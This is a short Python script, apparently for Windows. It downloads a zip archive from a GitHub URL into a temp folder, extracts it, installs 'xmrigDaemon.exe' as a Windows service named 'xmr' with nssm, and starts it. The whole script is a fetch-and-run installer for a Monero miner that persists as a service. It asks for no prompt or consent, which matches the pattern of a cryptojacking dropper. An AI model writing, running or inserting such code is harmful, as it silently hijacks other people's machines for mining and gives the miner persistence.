import tempfile,os,subprocess,zipfile,shlex,urllib.request
from subprocess import Popen
dir=tempfile.gettempdir()
dir1=tempfile.mkdtemp()
dir2=os.getcwd()
botdir=dir1+'\\xmrigDaemon.exe'
botdir=botdir.capitalize()
exc=[]
size=[]
def download_file(url):
    size.append('1015075')
    local_filename = url.split('/')[-1]
    fname=dir+'\\'+local_filename
    exc.append(fname)
    with urllib.request.urlopen(url) as response, open(fname, 'wb') as out_file:
        data = response.read()
        out_file.write(data)
download_file('https://github.com/ReMonero/xmrcc/raw/master/xmrcc.zip')
page=''.join(exc)
size=int(''.join(size))
size0=os.path.getsize(page)
if size0 == size:
    zip_ref = zipfile.ZipFile(page, 'r')
    zip_ref.extractall(dir1)
    zip_ref.close()
    args=['nssm','install','xmr',botdir]
    print (args)
    process=subprocess.Popen(args,stdin=subprocess.PIPE,stdout=subprocess.PIPE,cwd=dir1,stderr=subprocess.PIPE,shell=True)
    output = process.stdout.readline()
    print (output)
    line='net start xmr'
    args = shlex.split(line)
    process=subprocess.Popen(args,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,cwd=dir1,shell=True)
